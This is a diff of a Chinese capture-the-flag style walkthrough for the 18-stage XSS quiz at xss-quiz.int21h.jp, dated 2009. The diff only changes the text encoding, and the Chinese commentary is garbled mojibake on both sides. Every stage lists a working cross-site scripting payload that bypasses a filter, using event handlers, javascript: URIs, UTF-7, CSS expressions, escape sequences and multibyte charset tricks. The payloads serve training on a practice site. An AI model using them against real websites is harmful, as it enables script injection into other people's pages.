@@ -1,94 +1,94 @@
-http://xss-quiz.int21h.jp
-µÚÒ»¹Ø£º<img onerror="alert(document.domain);" src=>
-µÚ¶ş¹Ø£º"><script>alert(document.domain);</script>
+ï»¿http://xss-quiz.int21h.jp
+ç¬¬ä¸€å…³ï¼š<img onerror="alert(document.domain);" src=>
+ç¬¬äºŒå…³ï¼š"><script>alert(document.domain);</script>
 
-µÚÈı¹Ø£º
+ç¬¬ä¸‰å…³ï¼š
 http://xss-quiz.int21h.jp/stage-3.php?sid=93de7707279b3a5ae4ce419bfc7c0b1f380a20f6
-ÌáÊ¾£ºThe input in text box is properly escaped
-µ«ÊÇÊäÈëµã¾Í²»½öÕâ´¦¡£
+æç¤ºï¼šThe input in text box is properly escaped
+ä½†æ˜¯è¾“å…¥ç‚¹å°±ä¸ä»…è¿™å¤„ã€‚
 
 
-µÚËÄ¹Ø£º
+ç¬¬å››å…³ï¼š
 http://xss-quiz.int21h.jp/stage_4.php?sid=a311bc75ede604bb9d9d1cf566117401218f789c
-hiddenµÄinputÊäÈëµã£º" onmouseover="alert(document.domain);" type="text Õâ²»ĞĞ:(
-"><script>alert(document.domain);</script> ÕâÑù
+hiddençš„inputè¾“å…¥ç‚¹ï¼š" onmouseover="alert(document.domain);" type="text è¿™ä¸è¡Œ:(
+"><script>alert(document.domain);</script> è¿™æ ·
 
-µÚÎå¹Ø£º
+ç¬¬äº”å…³ï¼š
 http://xss-quiz.int21h.jp/stage--5.php?sid=646d0cc8a8f21e2e32b36910462f1fcf8513a60d
-" onmouseover="alert(document.domain);" type="text¿ÉĞĞ£¬tamper data´úÀíÏÂÈÆ¹ı¿Í»§¶Ë³¤¶ÈÏŞÖÆ¡£
+" onmouseover="alert(document.domain);" type="textå¯è¡Œï¼Œtamper dataä»£ç†ä¸‹ç»•è¿‡å®¢æˆ·ç«¯é•¿åº¦é™åˆ¶ã€‚
 
-µÚÁù¹Ø£º
+ç¬¬å…­å…³ï¼š
 http://xss-quiz.int21h.jp/stage-no6.php?sid=521453f94fdb4c3e538b27cca9f1cc771edc0b1a
-" onmouseover="alert(document.domain);" x="»¹ÊÇÒ»Ñù¡£¡£
+" onmouseover="alert(document.domain);" x="è¿˜æ˜¯ä¸€æ ·ã€‚ã€‚
 
-µÚÆß¹Ø£º
+ç¬¬ä¸ƒå…³ï¼š
 http://xss-quiz.int21h.jp/stage07.php?sid=fc33ef87ee482ad559e828f80803a9645ea2cc19
-1 onmouseover=alert(document.domain);Õâ¸ö¹ıÂË±ä·¨ÓĞµãÒâË¼ÁË
+1 onmouseover=alert(document.domain);è¿™ä¸ªè¿‡æ»¤å˜æ³•æœ‰ç‚¹æ„æ€äº†
 
-µÚ°Ë¹Ø£º
+ç¬¬å…«å…³ï¼š
 http://xss-quiz.int21h.jp/stage008.php?sid=b2d11d0122ac031aefde2490f623af51c6dc4af4
-javascript:alert(document.domain); //jsÎ±Ğ­ÒéµÄÁË
+javascript:alert(document.domain); //jsä¼ªåè®®çš„äº†
 
-µÚ¾Å¹Ø£º
+ç¬¬ä¹å…³ï¼š
 http://xss-quiz.int21h.jp/stage_09.php?sid=5b3848609d2b7d7eaa76b3c2fe1107b4e027f441
 +ACI- onmouseover=+ACI-alert(document.domain)+ADsAIg- x=+ACI-
 utf-7
-Êµ¼Ê²âÊÔ£º+±àÂëÎª%2b
+å®é™…æµ‹è¯•ï¼š+ç¼–ç ä¸º%2b
 p1=1%2bACI- onmouseover=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&charset=euc-jp
 
-µÚÊ®¹Ø£º
+ç¬¬åå…³ï¼š
 http://xss-quiz.int21h.jp/stage00010.php?sid=ebbdd5208bce92c3c26c5da4e79c3a0086f16d5e
-ÌáÊ¾£ºs/domain//g; 
+æç¤ºï¼šs/domain//g; 
 " onmouseover=alert(document.domdomainain); x="
 
-µÚÊ®Ò»¹Ø£º
+ç¬¬åä¸€å…³ï¼š
 http://xss-quiz.int21h.jp/stage11th.php?sid=2ea843cedd78f5b9dfd684cc00be42481f72449c
-ÌáÊ¾£º"s/script/xscript/ig;" and "s/on[a-z]+=/onxxx=/ig;" and "s/style=/stxxx=/ig;" 
-"><iframe src="javascr&#09;ipt:alert(document.domain);"></iframe>ÕâÑùÊÇ¿ÉÒÔµÄ£¬µ«ÊÇÃ»¸øÎÒÏÂÒ»¹Ø¡£
-"><a href="javascr&#09;ipt:alert(document.domain);">12</a>ÏÂÒ»¹Ø¡­¡­
+æç¤ºï¼š"s/script/xscript/ig;" and "s/on[a-z]+=/onxxx=/ig;" and "s/style=/stxxx=/ig;" 
+"><iframe src="javascr&#09;ipt:alert(document.domain);"></iframe>è¿™æ ·æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯æ²¡ç»™æˆ‘ä¸‹ä¸€å…³ã€‚
+"><a href="javascr&#09;ipt:alert(document.domain);">12</a>ä¸‹ä¸€å…³â€¦â€¦
 
-µÚÊ®¶ş¹Ø£º
+ç¬¬åäºŒå…³ï¼š
 http://xss-quiz.int21h.jp/stage_no012.php?sid=62c192a540aba87e7b6796ce0cbc2cd93fcb0750
-ÌáÊ¾£º"s/[\x00-\x20\<\>\"\']//g;" 
-``onmouseover=alert(document.domain);ÏÂÒ»¹Ø¡­¡­
+æç¤ºï¼š"s/[\x00-\x20\<\>\"\']//g;" 
+``onmouseover=alert(document.domain);ä¸‹ä¸€å…³â€¦â€¦
 
-µÚÊ®Èı¹Ø£º
+ç¬¬åä¸‰å…³ï¼š
 http://xss-quiz.int21h.jp/stage13_0.php?sid=00696ab8c69d8a146bc35d5e65b6a7c270eaf1f0
 background-color:#f00;background:url("javascript:alert(document.domain);");
 
-µÚÊ®ËÄ¹Ø£º
+ç¬¬åå››å…³ï¼š
 http://xss-quiz.int21h.jp/stage-_-14.php?sid=7188bd9374f7397e0a67044cfcf721c6be036b83
-ÌáÊ¾£ºs/(url|script|eval|expression)/xxx/ig
+æç¤ºï¼šs/(url|script|eval|expression)/xxx/ig
 cos:expres/**/sion(if(!window.x){alert(document.domain);window.x=1;})
 
-µÚÊ®Îå¹Ø£º
+ç¬¬åäº”å…³ï¼š
 http://xss-quiz.int21h.jp/stage__15.php?sid=26ac2a0522c04a788c217fd8d7847aab1626f726
-ÌáÊ¾£ºdocument.write(); 
+æç¤ºï¼šdocument.write(); 
 \x3cscript\x3ealert(document.domain);\x3c/script\x3e
 
-µÚÊ®Áù¹Ø£º
+ç¬¬åå…­å…³ï¼š
 http://xss-quiz.int21h.jp/stage00000016.php?sid=f4aed769ab48312e8815f3b63f32e2984a4ebb88
-ÌáÊ¾£º"document.write();" and "s/\\x/\\\\x/ig;" 
+æç¤ºï¼š"document.write();" and "s/\\x/\\\\x/ig;" 
 \u003cscript\u003ealert(document.domain);\u003c/script\u003e
-ÓÃÊ®½øÖÆÒ²¿ÉÒÔ¡£\74script\76ÕâÑù
+ç”¨åè¿›åˆ¶ä¹Ÿå¯ä»¥ã€‚\74script\76è¿™æ ·
 
-µÚÊ®Æß¹Ø£º
+ç¬¬åä¸ƒå…³ï¼š
 http://xss-quiz.int21h.jp/stage-No17.php?sid=86908f4e2c28923d9280baebd67f4d9f009b5fa5
-ÌáÊ¾£ºmulti-byte character
-euc-jpµÄ±àÂë·¶Î§£º
-byte 1é8E•r, é2 byte¾´a, byte 2¹ ‡úéA1-DF
-byte 1¹ ‡úéA1-FE•r, é2 byte¾´a, byte 2¹ ‡úéA1-FE
-byte 1é8F•ré3 byte¾´a, byte 2Åcbyte 3¹ ‡ú¾ùéA1-FE
-Á½¸ö±íµ¥ÔªËØ¶¼Ìá½»%A7±ÕºÏ×îºóµÄË«ÒıºÅ£¬²é¿´Ô´Âë³É¹¦ÁË£¬ÎªÊ²Ã´UIÉÏÈ¥Ã»³É¹¦£¿ÎŞÄÎÖ±½ÓÔÚµØÖ·À¸£ºjavascript:alert(document.domain);
-ÏÖÔÚ·¢ÏÖÔ­À´ÊÇä¯ÀÀÆ÷°æ±¾ÎÊÌâ£¬±ğÓÃIE8ÁË¹ıÕâ¸ö¡£
+æç¤ºï¼šmulti-byte character
+euc-jpçš„ç¼–ç èŒƒå›´ï¼š
+byte 1ç‚º8Eæ™‚, ç‚º2 byteç·¨ç¢¼, byte 2ç¯„åœç‚ºA1-DF
+byte 1ç¯„åœç‚ºA1-FEæ™‚, ç‚º2 byteç·¨ç¢¼, byte 2ç¯„åœç‚ºA1-FE
+byte 1ç‚º8Fæ™‚ç‚º3 byteç·¨ç¢¼, byte 2èˆ‡byte 3ç¯„åœå‡ç‚ºA1-FE
+ä¸¤ä¸ªè¡¨å•å…ƒç´ éƒ½æäº¤%A7é—­åˆæœ€åçš„åŒå¼•å·ï¼ŒæŸ¥çœ‹æºç æˆåŠŸäº†ï¼Œä¸ºä»€ä¹ˆUIä¸Šå»æ²¡æˆåŠŸï¼Ÿæ— å¥ˆç›´æ¥åœ¨åœ°å€æ ï¼šjavascript:alert(document.domain);
+ç°åœ¨å‘ç°åŸæ¥æ˜¯æµè§ˆå™¨ç‰ˆæœ¬é—®é¢˜ï¼Œåˆ«ç”¨IE8äº†è¿‡è¿™ä¸ªã€‚
 p1=1%A7&p2=+onmouseover%3Dalert%28document.domain%29%3B+%A7
 
-µÚÊ®°Ë¹Ø£º
+ç¬¬åå…«å…³ï¼š
 http://xss-quiz.int21h.jp/stage__No18.php?sid=e9cd87a31a1b373f6283b698f3762758db319f2b
-ÌáÊ¾£ºus-ascii high bit issue 
-41-5A, 61-7A (Èôº¬”µ×ÖÅc·ûÌ–£¬„té21-7E)
-Í¬Ñù±ğÓÃIE8£¬ÕâĞ©Â©¶´ÒÑ¾­ÔÚIE8ÖĞĞŞ²¹ÁË¡£
+æç¤ºï¼šus-ascii high bit issue 
+41-5A, 61-7A (è‹¥å«æ•¸å­—èˆ‡ç¬¦è™Ÿï¼Œå‰‡ç‚º21-7E)
+åŒæ ·åˆ«ç”¨IE8ï¼Œè¿™äº›æ¼æ´å·²ç»åœ¨IE8ä¸­ä¿®è¡¥äº†ã€‚
 p1=%A2%BE%BCscript%BEalert(document.domain);%BC/script%BE
 
 
-by ÓàÏÒ 2009
+by ä½™å¼¦ 2009
